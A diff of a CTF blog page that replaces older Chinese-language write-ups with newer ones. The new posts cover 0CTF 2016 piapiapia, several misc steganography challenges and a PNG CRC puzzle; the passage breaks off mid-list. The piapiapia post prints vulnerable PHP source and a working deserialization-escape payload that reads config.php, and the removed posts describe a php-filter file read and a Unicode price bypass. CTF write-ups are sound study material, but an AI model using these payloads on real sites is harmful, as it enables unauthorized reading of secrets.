@@ -71,10 +71,10 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-page-56" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-page-68" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2021/07/08/page-56/" class="article-date">
-  <time class="dt-published" datetime="2021-07-08T06:35:08.000Z" itemprop="datePublished">2021-07-08</time>
+    <a href="/2021/07/13/page-68/" class="article-date">
+  <time class="dt-published" datetime="2021-07-13T08:58:39.000Z" itemprop="datePublished">2021-07-13</time>
 </a>
     
   </div>
@@ -85,7 +85,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/07/08/page-56/">BSidesCF2020Had a badday1</a>
+      <a class="p-name article-title" href="/2021/07/13/page-68/">0CTF 2016piapiapia</a>
     </h1>
   
 
@@ -93,17 +93,42 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>url有点类似伪协议<br>?categery 这个和php伪协议有点像<br>试一下伪协议     可以获取到源代码 的base64   </p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/2.PNG?raw=true" alt="2.PNG"></p>
-<p>解码也没找出什么东西但是吧发现可以用来读取东西<img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/3.PNG?raw=true" alt="3.PNG"></p>
-<p>这边可以读到图片的base64后的结果</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/4.PNG?raw=true" alt="4.PNG"></p>
-<p>那么这样就拿到flag了</p>
+        <p>一来就试了一下sql注入 无<br>然后<strong>找到一个register.php</strong> 的页面 那边有个上传 也无上传漏洞<br>dirsearch 添加延时参数 <strong>找到<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></strong> 下载下来得到源码<br>拿到源码 <strong>class.php config.php index.php profile.php register.php update.php</strong><br><strong>config.php 那边有flag 从那边应该可以拿到flag</strong><br>update.php 这边正则匹配了 过滤提交的数据 但是判断nickname那边有长度限制可以用nickname的数组来绕过长度限制就不会die</p>
+<p>png29 这边用到了serialize() 可以试一下反序列化</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/29.PNG?raw=true" alt="29.PNG"></p>
+<p>前面<br>有个update_profile  到class.php 看一下update_profile  的定义方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::filter(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$new_profile</span> = <span class="built_in">parent</span>::filter(<span class="variable">$new_profile</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>再往下有个<strong>filter()</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">		<span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">		<span class="variable">$string</span> = preg_replace(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">		<span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> preg_replace(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>update()</strong> </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$where</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;UPDATE <span class="subst">$table</span> SET <span class="subst">$key</span> = &#x27;<span class="subst">$value</span>&#x27; WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>update.php 就先正则表达式将提交的参数值过滤 再序列化将非法字符替换成hacker<br>这反序列化还有文件读取       </p>
+<p>  <strong>flag在config中</strong> 这边有序列化 过滤替换 反序列化 文件读取<br>就是反序列化字符逃逸  构造包含config.php的数据利用字符串逃逸 再在profile.php中读取得到<br>反序列化是以”;}结束的 把这个往前放置 就可以将反序列化提前结束的内容就丢弃了<br>突破口：<br> 反序列化字符逃逸，首先序列化的字符是可控的 前面的长度是可控的 但是update.php将参数序列化，可控变量的长度就被写死了<br>要控制得通过序列化后数据过滤替代那边</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$escape</span> = <span class="keyword">array</span>(<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>);</span><br><span class="line">		<span class="variable">$escape</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$escape</span>) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">		<span class="variable">$string</span> = preg_replace(<span class="variable">$escape</span>, <span class="string">&#x27;_&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$safe</span> = <span class="keyword">array</span>(<span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;insert&#x27;</span>, <span class="string">&#x27;update&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>, <span class="string">&#x27;where&#x27;</span>);</span><br><span class="line">		<span class="variable">$safe</span> = <span class="string">&#x27;/&#x27;</span> . implode(<span class="string">&#x27;|&#x27;</span>, <span class="variable">$safe</span>) . <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> preg_replace(<span class="variable">$safe</span>, <span class="string">&#x27;hacker&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">   </span><br></pre></td></tr></table></figure>
+
+<p>select insert update delete where替换成hacker  写入where替换成hacker 字符串长度+1 因此实际的长的都大于序列化固定长度<br>i:0;s:3:”123”;     -&gt; 就是类似于s:后面这个值           反序列化字符串的逃逸，反序列化只能将nickname的s长度反序列化成功其他的长度已经被写死了， 剩下的字符串 构造class.php因为里面包含了flag 并将其位置放到photo上然后将photo扔掉<br>这样profile.php 中读取的photo就是我么构造的config.php 就能拿到flag了<br>假设：</p>
+<?php
+//$a = array('123', 'abc', 'defg');
+//var_dump(serialize($a));
+//"a:3:{i:0;s:3:"123";i:1;s:3:"abc";i:2;s:4:"defg";}"
+$a = 'a:3:{i:0;s:3:"123";i:1;s:3:"abc";i:2;s:4:"defg";}';
+$b = 'a:3:{i:0;s:3:"123";i:1;s:3:"abc";i:2;s:5:"qwert";}";i:2;s:4:"defg";}';
+var_dump(unserialize($b));
+var_dump(unserialize($b));
+?><p>构造这样一个 defg会被丢弃qwert占了原本的位置<br>目的是将”;}s:5:photo;s:10:”config.php”;}  这串总共34位  插入到序列化的字符串中<br>hacker比where多一个字符那就得需要挤出34位 也就是34个where 上传后再去profile查看内容</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/30.PNG?raw=true" alt="30.PNG"></p>
+<p>payload ：wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere”;}s:5:photo;s:10:”config.php”;}</p>
+<p>profile.php 那边查看源码 base64解码一下就可以了</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/31.PNG?raw=true" alt="31.PNG"></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/32.PNG?raw=true" alt="32.PNG"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/07/08/page-56/" data-id="ckrosnlum0011mow72dmd8yq0" data-title="BSidesCF2020Had a badday1" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/07/13/page-68/" data-id="ckrosnlus001cmow7hv2t0k8c" data-title="0CTF 2016piapiapia" class="article-share-link">Share</a>
       
       
       
@@ -115,10 +140,10 @@
 
 
   
-    <article id="post-page-55" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-page-67" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2021/06/11/page-55/" class="article-date">
-  <time class="dt-published" datetime="2021-06-11T13:30:26.000Z" itemprop="datePublished">2021-06-11</time>
+    <a href="/2021/07/13/page-67/" class="article-date">
+  <time class="dt-published" datetime="2021-07-13T08:35:42.000Z" itemprop="datePublished">2021-07-13</time>
 </a>
     
   </div>
@@ -129,7 +154,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/06/11/page-55/">page</a>
+      <a class="p-name article-title" href="/2021/07/13/page-67/">misc</a>
     </h1>
   
 
@@ -137,15 +162,45 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>a这我真的找不出哪边语法错误怎么改都提示错误┗|｀O′|┛ <img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/234.PNG?raw=true" alt="234.PNG"></p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/233.PNG?raw=true" alt="233.PNG"></p>
-<p> <img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/sssq.PNG?raw=true" alt="sssq.PNG"></p>
-<p> <img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/235.PNG?raw=true" alt="235.PNG"></p>
+        <p><strong>ACTF新生赛2020 outguess</strong></p>
+<p>解压发现一大堆的文件但是大部分都没什么意义<br>flag.txt 打开后发现<br>flag在哪？<br>你Guess一下啊！这么一段话<br>猜测应该是图片隐写 要用到outguess<br>mmm.jpg的属性那边备注这么段信息</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/13.PNG?raw=true" alt="13.PNG"></p>
+<p>有个叫什么社会主义核心价值观的加密<br>解码一下得到abc三个字母<br>那就没错了<br>就拿到flag了ACTF{gue33_Gu3Ss!2020}</p>
+<p><strong>SWPU2019我有一只马里奥</strong></p>
+<p>下载下来得到一个文件运行生成一个1.txt 打开提示如下<br>ntfs<br>flag.txt<br>应该是ntfs隐写<br>用ntfsstreamediter导出即可</p>
+<p><strong>谁赢了比赛？</strong></p>
+<p>丢010 发现还有压缩包<br>文件分离 得压缩包 暴力破解是个四位数密码<br>拿到一张gif 逐帧分析第310帧有不一样的 </p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/25.PNG?raw=true" alt="25.PNG"></p>
+<p>用stegsolve red plane 0</p>
+<p>那边得到一张二维码 扫一下就可以了</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/26.PNG?raw=true" alt="26.PNG"></p>
+<p>**HBNIS2018excel破解 **<br>直接丢010 然后查找一下找到flag is here 就找到flag了 这么简单？</p>
+<p><strong>ACTF新生赛2020 base64隐写</strong></p>
+<p>base64隐写的原理：</p>
+<p>从Base64编码的原理我们很自然推出Base64解码的过程：</p>
+<p>丢掉末尾的所有‘=’；<br>每个字符查表转换为对应的6位索引，得到一串二进制字符串；<br>从头开始，每次取8位转换为对应的ASCII字符，如果不足8位则丢弃。<br>在解码的第3步中，会有部分数据被丢弃（即不会影响解码结果），这些数据正是我们在编码过程中补的0（本文第三第四张图中加粗的部分）。也就是说，如果我们在编码过程中不全用0填充，而是用其他的数据填充，仍然可以正常编码解码，因此这些位置可以用于隐写。</p>
+<p>解开隐写的方法就是将这些不影响解码结果的位提取出来组成二进制串，然后转换成ASCII字符串。<br>依次读取每行，从中提取出隐写位。<br>如果最后没有‘=’，说明没有隐写位，跳过。<br>如果最后是一个‘=’，说明有两位隐写位，将倒数第二个字符转化为对应的二进制索引，然后取后两位。<br>如果最后是两个‘=’，说明有四位隐写位，将倒数第三个字符转化为对应的二进制索引，然后取后四位。<br>将每行提取出的隐写位依次连接起来，每8位为一组转换为ASCII字符，最后不足8位的丢弃。</p>
+<p>贴一下解题脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inttobin</span>(<span class="params">a, n</span>):</span></span><br><span class="line">    ret = <span class="built_in">bin</span>(a)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(ret) &lt; n:</span><br><span class="line">        ret = <span class="string">&#x27;0&#x27;</span> + ret</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;ComeOn!.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">tmpbin = <span class="string">&#x27;&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">line = f.readline()</span><br><span class="line"><span class="keyword">while</span> line:</span><br><span class="line">    <span class="keyword">if</span> line[-<span class="number">2</span>] == <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> line[-<span class="number">3</span>] == <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">            tmpbin += inttobin(table.index(line[-<span class="number">4</span>]), <span class="number">6</span>)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmpbin += inttobin(table.index(line[-<span class="number">3</span>]), <span class="number">6</span>)[<span class="number">4</span>:]</span><br><span class="line">    line = f.readline()</span><br><span class="line">quotient = <span class="built_in">len</span>(tmpbin)/<span class="number">8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(quotient):</span><br><span class="line">    res += <span class="built_in">chr</span>(<span class="built_in">int</span>(tmpbin[<span class="number">8</span>*i:<span class="number">8</span>*i+<span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span> res</span><br></pre></td></tr></table></figure>
+
+<p>附一下base64编码解码脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">table = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inttobin</span>(<span class="params">a, n</span>):</span></span><br><span class="line">    res = <span class="built_in">bin</span>(a)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(res) &lt; n:</span><br><span class="line">        res = <span class="string">&#x27;0&#x27;</span> + res</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b64encode</span>(<span class="params">strin</span>):</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    quotient = <span class="built_in">len</span>(strin)/<span class="number">3</span></span><br><span class="line">    remainder = <span class="built_in">len</span>(strin)%<span class="number">3</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(quotient):</span><br><span class="line">        tmp = strin[i*<span class="number">3</span>:i*<span class="number">3</span>+<span class="number">3</span>]</span><br><span class="line">        tmpbin = inttobin(<span class="built_in">ord</span>(tmp[<span class="number">0</span>]), <span class="number">8</span>) + inttobin(<span class="built_in">ord</span>(tmp[<span class="number">1</span>]), <span class="number">8</span>) + inttobin(<span class="built_in">ord</span>(tmp[<span class="number">2</span>]), <span class="number">8</span>)</span><br><span class="line">        <span class="built_in">print</span> tmpbin</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            index = <span class="built_in">int</span>(tmpbin[<span class="number">6</span>*j:<span class="number">6</span>*j+<span class="number">6</span>], <span class="number">2</span>)</span><br><span class="line">            res += table[index]</span><br><span class="line">    <span class="keyword">if</span> remainder == <span class="number">1</span>:</span><br><span class="line">        tmpbin = inttobin(<span class="built_in">ord</span>(strin[-<span class="number">1</span>]), <span class="number">8</span>) + <span class="string">&#x27;0000&#x27;</span></span><br><span class="line">        res += table[<span class="built_in">int</span>(tmpbin[:<span class="number">6</span>], <span class="number">2</span>)]</span><br><span class="line">        res += table[<span class="built_in">int</span>(tmpbin[<span class="number">6</span>:], <span class="number">2</span>)]</span><br><span class="line">        res += <span class="string">&#x27;==&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> remainder == <span class="number">2</span>:</span><br><span class="line">        tmpbin = inttobin(<span class="built_in">ord</span>(strin[-<span class="number">2</span>]), <span class="number">8</span>) + inttobin(<span class="built_in">ord</span>(strin[-<span class="number">1</span>]), <span class="number">8</span>) + <span class="string">&#x27;00&#x27;</span></span><br><span class="line">        res += table[<span class="built_in">int</span>(tmpbin[:<span class="number">6</span>], <span class="number">2</span>)]</span><br><span class="line">        res += table[<span class="built_in">int</span>(tmpbin[<span class="number">6</span>:<span class="number">12</span>], <span class="number">2</span>)]</span><br><span class="line">        res += table[<span class="built_in">int</span>(tmpbin[<span class="number">12</span>:], <span class="number">2</span>)]</span><br><span class="line">        res += <span class="string">&#x27;=&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">b64decode</span>(<span class="params">strin</span>):</span></span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> strin[-<span class="number">1</span>] == <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">        strin = strin[:-<span class="number">1</span>]</span><br><span class="line">    tmpbin = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(strin)):</span><br><span class="line">        tmpbin += inttobin(table.index(strin[i]), <span class="number">6</span>)</span><br><span class="line">    remainder = <span class="built_in">len</span>(tmpbin) / <span class="number">8</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(remainder):</span><br><span class="line">        res += <span class="built_in">chr</span>(<span class="built_in">int</span>(tmpbin[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>
+
+<p><strong>sqltest</strong><br>wireshark打开然后导出为http对象列表<br>png28<br>发现这在进行盲注bool注入的语句<br>推断出正确的ascii值，在对一个字符进行bool判断时，被重复判断的ASCII值就是正确的字符</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/28.PNG?raw=true" alt="28.PNG"></p>
+<p>最后提取到：<br>102 108 97 103 123 52 55 101 100 98 56 51 48 48 101 100 53 102 57 98 50 56 102 99 53 52 98 48 100 48 57 101 99 100 101 102 55 125<br>转为字符串得flag<br>flag{47edb8300ed5f9b28fc54b0d09ecdef7}</p>
+<p><strong>GXYCTF2019 gakki</strong></p>
+<p>老样子丢010 发现还有个压缩包 文件分离 暴力破解<br>然后拿到一个文本文档</p>
+<p>#2V0VI_05X$GygD3<em>g@gYurMGim#1=)D_@Z(JcRevlyGq&amp;N-dgPH8XXSGL{@9}zVmlmxv1vEwbqr)ea!YMI2lznoV_bMrXLbwFrgaiQYfsVN14weObXp)(ybmXjXuTkFuj1pG54!mij1){41gKmFL&amp;Zgeho01PPEwE=r</em>csndRof$X7JBJ=CaNRGMjLY_-GiqlDHWaVk-XZ<em>8lD5!kLb(OH%8u2LtQXX3QV{1Lh)LyGF#kpV$}GXRKla)u(pw(&amp;ggmYU82HLWhJgngOjhwofkqqC{Hi)g!GXrY6=UQGvaeOIrVg</em>jkGjgGRTY78Ol$w0&amp;tzZ1t}z#<em>c^t8GrskRcz9YKE</em>)4B(U<br>一堆的乱七八糟的<br><strong>字频统计</strong>    脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-* -coding:utf-8 -* -</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Author: mochu7</span></span><br><span class="line">alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =\\&#123;\\&#125;[]&quot;</span></span><br><span class="line">strings = <span class="built_in">open</span>(<span class="string">&#x27;./flag.txt&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">result = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> alphabet:</span><br><span class="line">	counts = strings.count(i)</span><br><span class="line">	i = <span class="string">&#x27;&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">	result[i] = counts</span><br><span class="line"></span><br><span class="line">res = <span class="built_in">sorted</span>(result.items(),key=<span class="keyword">lambda</span> item:item[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> res:</span><br><span class="line">	<span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">	flag = <span class="built_in">str</span>(i[<span class="number">0</span>])</span><br><span class="line">	<span class="built_in">print</span>(flag[<span class="number">0</span>],end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/27.PNG?raw=true" alt="27.PNG"></p>
+<p>跑完拿到flag<br>有一说一gakki是真的好看</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/06/11/page-55/" data-id="ckrosnluk0010mow76v01h2qn" data-title="page" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/07/13/page-67/" data-id="ckrosnlur001bmow77466gz35" data-title="misc" class="article-share-link">Share</a>
       
       
       
@@ -157,10 +212,10 @@
 
 
   
-    <article id="post-page-54" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <article id="post-page-66" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
-    <a href="/2021/06/11/page-54/" class="article-date">
-  <time class="dt-published" datetime="2021-06-11T12:43:01.000Z" itemprop="datePublished">2021-06-11</time>
+    <a href="/2021/07/13/page-66/" class="article-date">
+  <time class="dt-published" datetime="2021-07-13T08:32:45.000Z" itemprop="datePublished">2021-07-13</time>
 </a>
     
   </div>
@@ -171,7 +226,7 @@
         
   
     <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/06/11/page-54/">page[ASIS 2019]Unicornshop1</a>
+      <a class="p-name article-title" href="/2021/07/13/page-66/">BJDCTF2020一叶障目</a>
     </h1>
   
 
@@ -179,20 +234,19 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>抓包<strong>网页编码格式utf-8</strong> 这个很重要</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/113.PNG?raw=true" alt="113.PNG"></p>
-<p>根据题目的提示，这题应该和unicode有关  寻找一个unicode 用来是金额的</p>
-<p>这里  <strong>post数据id=1&amp;price=23</strong>  这边如果都是数字会提示错误 所有price只能用Unicode 表示 </p>
-<p>找一个足够大的 <img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/112.PNG?raw=true" alt="112.PNG"></p>
-<p>然后会发现1 2 3 都没法买</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/111.PNG?raw=true" alt="111.PNG"></p>
-<p>到4 就可以了 </p>
-<p>这边得用utf-8编码的格式进行输入 然后还得改成 url编码0x改成%即可 </p>
+        <p>打开就是一个图片什么都没 stegsolve分析也分析不出什么东西  010也看不出什么 百度吧<br><strong>这是png的CRC校验问题，图片的宽高被改了导致无法完全显示</strong></p>
+<p><strong>如何判断这什么crc校验问题？</strong><br><strong>首先010打开1.png</strong><br><strong>前八个字节89 50 4E 47 0D 0A 1A 0A为png的文件头，该段格式是固定的</strong><br><strong>PNG_CHUNK chunk[0] 这段可分为几块：</strong><br><strong>前四个字节00 00 00 0D 代表数据块长度为13 数据块包含了png的宽高等信息 格式是固定的</strong><br><strong>之后四个字节49 48 44 52 （即ASCII码的IHDR） 是文件头数据块的表示 这段也是固定格式的</strong><br><strong>之后进入十三位数据块  前八个字节 00 00 01 41 00 00 01 4C</strong><br><strong>这边前四个字节：00 00 01 41 代表图片的宽  后四个字节 00 00 01 4C代表高</strong><br><strong>这八个字节都属于十三位数据块的内容 因此数据块应再向后5个字节 即 00 00 01 41 00 00 01 4C 08 06 00 00 00 剩余四位C2 0F 1F C6 为该png的crc校验码也就是解题的关键</strong><br><strong>该段数据有IDCh以及十三位的数据块 即 49 48 44 52 00 00 01 41 00 00 01 4C 08 06 00 00 00 计算所得</strong><br>大部分png中CRC检验错误的出题思路：</p>
